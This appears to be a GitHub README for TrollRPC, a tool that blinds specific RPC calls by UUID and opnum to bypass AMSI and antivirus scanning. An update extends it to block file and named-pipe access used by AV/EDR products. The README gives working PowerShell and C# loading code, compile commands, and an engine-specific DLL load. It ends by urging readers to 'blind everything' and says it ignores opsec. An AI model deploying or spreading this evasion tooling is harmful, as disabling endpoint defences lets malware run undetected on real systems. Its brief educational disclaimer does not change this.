## UPDATES
```diff
! UPDATE 11/06/2025
! Added TrollPipe.cs to block CreateFileW to Files or Named Pipes because some AV/EDR use that instead of RPC
! [TrollPipe]::DisappearFileorPipe("<pipe or file name>")
'''

# TrollRPC
So what is TrollRPC? Its a library to blind RPC calls based on UUID and OPNUM
![Image](https://github.com/user-attachments/assets/e0fb9e17-def8-4627-847f-7bc60449115a)
<br/> 
https://github.com/andreisss/Ghosting-AMSI released a amsi bypass by breaking NdrClientCall3 which means every subsequent RPC call (eg. some name resolution uses RPC thats why web requests to github fail) breaks which kind of makes the technique obsolete. This particular dll will only break the specific RPC call to the AV scan engine, allowing all other RPC calls through. This means you can bypass amsi for **both powershell/clr** and then continue running commands that require RPC (everything lol). 

## C#
```
[System.Reflection.Assembly]::LoadFile("C:\TrollRPC.dll") 
$UUID = "c503f532-443a-4c69-8300-ccd1fbdb3839"             # The UUID you are targetting
$Opnum = 0x5E                                              # The opnum you are targetting
$Opnum_break = 0x1F4                                       # Modify the opnum to an invalid value                   
[TrollRPC]::Blind($UUID, $Opnum, $Opnum_break)
```

## C++
C++ doesnt allow dynamic input of UUID and OPNUM, have to manually tweak the asmstub to put in the OPNUM you want and recompile (easiest way)
```
#Use Visual Studio Command Prompt to compile first, alternatively, you can use the compiled dll
ml64 /c /nologo /Fo AsmStub.obj AsmStub.asm
cl /LD /O2 /MD /DNDEBUG /Zl /GS- /Gy /GF TrollRPC.cpp AsmStub.obj /link kernel32.lib user32.lib msvcrt.lib /OPT:REF /OPT:ICF /DEBUG:NONE /PDB:NONE

Running on powershell -> Right now its hardcoded for a specific AV engine ;)
Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);
"@ -Namespace Win32 -Name NativeMethods

[Win32.NativeMethods]::LoadLibrary("C:\TrollRPC.dll")
```

## Disclaimer
Should only be used for educational purposes!

## Upgrades
- Be creative, blind everything, not just amsi
- opsec not taken into consideration, its just functional








